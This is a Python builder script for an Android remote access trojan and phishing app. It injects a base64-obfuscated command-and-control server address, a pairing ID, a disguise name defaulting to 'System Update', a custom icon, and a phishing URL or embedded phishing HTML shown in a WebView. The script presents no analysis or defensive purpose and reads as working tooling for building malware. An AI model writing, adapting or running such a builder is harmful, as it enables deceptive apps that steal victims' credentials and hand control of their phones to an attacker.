#!/usr/bin/env python3
"""Safe inject for minimal phishing base."""
import os, re, base64

ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
ANDROID = os.path.join(ROOT, "android")
MAIN_KT = os.path.join(ANDROID, "app/src/main/java/com/sync/xxx/MainActivity.kt")
DEVICE_KT = os.path.join(ANDROID, "app/src/main/java/com/sync/xxx/DeviceService.kt")
STRINGS = os.path.join(ANDROID, "app/src/main/res/values/strings.xml")
APP_GRADLE = os.path.join(ANDROID, "app/build.gradle")
MANIFEST = os.path.join(ANDROID, "app/src/main/AndroidManifest.xml")

APP_NAME = (os.environ.get("APP_NAME") or "System Update").strip()
APP_ID = (os.environ.get("APP_ID") or "com.sync.xxx").strip()
RAT_TYPE = (os.environ.get("RAT_TYPE") or "ALL").strip().upper()
REDIRECT_MODE = (os.environ.get("REDIRECT_MODE") or "URL").strip().upper()
REDIRECT_VALUE = os.environ.get("REDIRECT_VALUE") or "https://example.com"
SERVER_URL = (os.environ.get("SERVER_URL") or "http://papsky.queen-official.com:2468").strip()
PAIR_ID = (os.environ.get("PAIR_ID") or "NEONXJZET0000").strip()
VERSION_NAME = (os.environ.get("VERSION_NAME") or "1.0").strip()
VERSION_CODE = (os.environ.get("VERSION_CODE") or "1").strip()
ICON_B64 = (os.environ.get("ICON_BASE64") or os.environ.get("ICON_B64") or "").strip()

print("[inject]", APP_NAME, APP_ID, RAT_TYPE, REDIRECT_MODE, PAIR_ID)

# pair
uid = os.path.join(ANDROID, "app/src/main/assets/uid.json")
os.makedirs(os.path.dirname(uid), exist_ok=True)
open(uid, "w").write('{"uid":"%s","pair":"%s","auto":true}\n' % (PAIR_ID, PAIR_ID))

# server base64 in DeviceService
if os.path.isfile(DEVICE_KT):
    src = open(DEVICE_KT, encoding="utf-8", errors="ignore").read()
    b64 = base64.b64encode(SERVER_URL.encode()).decode()
    src2, n = re.subn(
        r'(Base64\.decode\(\s*")[^"]+(")',
        r"\1%s\2" % b64,
        src,
        count=1,
    )
    if n:
        open(DEVICE_KT, "w", encoding="utf-8").write(src2)
        print("[inject] SERVER_URL ok")
    else:
        print("[warn] SERVER_URL pattern missing")

# app name
if os.path.isfile(STRINGS):
    s = open(STRINGS, encoding="utf-8", errors="ignore").read()
    safe = APP_NAME.replace("&", "&amp;").replace("<", "&lt;")
    s = re.sub(r'(<string name="app_name">)[^<]*(</string>)', r"\1%s\2" % safe, s, count=1)
    open(STRINGS, "w", encoding="utf-8").write(s)

# applicationId version
if os.path.isfile(APP_GRADLE):
    g = open(APP_GRADLE, encoding="utf-8", errors="ignore").read()
    g = re.sub(r'applicationId\s+"[^"]*"', 'applicationId "%s"' % APP_ID, g, count=1)
    g = re.sub(r"versionCode\s+\d+", "versionCode %s" % VERSION_CODE, g, count=1)
    g = re.sub(r'versionName\s+"[^"]*"', 'versionName "%s"' % VERSION_NAME, g, count=1)
    open(APP_GRADLE, "w", encoding="utf-8").write(g)

# MainActivity URL / HTML
if os.path.isfile(MAIN_KT):
    m = open(MAIN_KT, encoding="utf-8", errors="ignore").read()
    if REDIRECT_MODE == "URL":
        url = REDIRECT_VALUE.strip()
        if not url.startswith("http"):
            url = "https://" + url
        esc = url.replace("\\", "\\\\").replace('"', '\\"')
        m2, n = re.subn(
            r'webView\.loadUrl\("[^"]*"\)',
            'webView.loadUrl("%s")' % esc,
            m,
            count=1,
        )
        if n:
            m = m2
            print("[inject] URL", url)
        else:
            print("[warn] loadUrl not found")
    else:
        raw = REDIRECT_VALUE.strip()
        if "<html" not in raw.lower():
            raw = "<!DOCTYPE html><html><body>%s</body></html>" % raw
        b64 = base64.b64encode(raw.encode()).decode()
        ap = os.path.join(ANDROID, "app/src/main/assets/phish.html.b64")
        open(ap, "w").write(b64)
        block = (
            'try { val b64 = assets.open("phish.html.b64").bufferedReader().readText(); '
            'val html = String(android.util.Base64.decode(b64, android.util.Base64.DEFAULT)); '
            'webView.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null) } '
            'catch (e: Exception) { webView.loadUrl("about:blank") }'
        )
        m2, n = re.subn(r'webView\.loadUrl\("[^"]*"\)', block, m, count=1)
        if n:
            m = m2
            print("[inject] HTML")
    open(MAIN_KT, "w", encoding="utf-8").write(m)

# icon
if ICON_B64:
    try:
        import io
        from pathlib import Path as P
        data = base64.b64decode(ICON_B64.split(",")[-1])
        try:
            from PIL import Image
            im = Image.open(io.BytesIO(data)).convert("RGBA")
            buf = io.BytesIO()
            im.save(buf, format="PNG")
            data = buf.getvalue()
        except Exception as e:
            print("[inject] pillow", e)
        res = P(ANDROID) / "app/src/main/res"
        for dens, size in (("mdpi", 48), ("hdpi", 72), ("xhdpi", 96), ("xxhdpi", 144), ("xxxhdpi", 192)):
            d = res / ("mipmap-%s" % dens)
            d.mkdir(parents=True, exist_ok=True)
            try:
                from PIL import Image
                im = Image.open(io.BytesIO(data)).convert("RGBA").resize((size, size), Image.LANCZOS)
                im.save(str(d / "ic_launcher.png"), format="PNG")
                im.save(str(d / "ic_launcher_round.png"), format="PNG")
            except Exception:
                (d / "ic_launcher.png").write_bytes(data)
                (d / "ic_launcher_round.png").write_bytes(data)
        print("[inject] icon custom")
    except Exception as e:
        print("[warn] icon", e)
else:
    print("[inject] icon default")

# TWO: strip extra perms from manifest (optional, safe)
if RAT_TYPE == "TWO" and os.path.isfile(MANIFEST):
    print("[inject] RAT TWO — manifest kept minimal already")

print("[inject] done")
